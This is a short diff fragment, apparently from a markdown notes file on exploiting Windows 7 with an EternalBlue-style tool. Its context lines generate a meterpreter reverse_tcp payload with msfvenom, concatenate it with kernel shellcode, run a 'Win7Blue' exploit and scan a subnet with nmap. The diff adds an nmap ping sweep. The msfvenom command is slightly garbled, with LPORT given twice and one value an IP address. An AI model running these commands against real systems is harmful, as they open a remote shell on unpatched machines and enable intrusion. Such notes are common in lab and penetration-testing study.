@@ -5,6 +5,7 @@ msfvenom --payload windows/meterpreter/reverse_tcp LPORT=172.17.227.104 LPORT=44
 cat sc_x86_kernel.bin shellcode.bin > sc_x86.bin
 ./Win7Blue
 nmap 172.17.226.0/24 -p 4444
+nmap -sn 172.17.226.0/24
 ```
 
 ```msfg
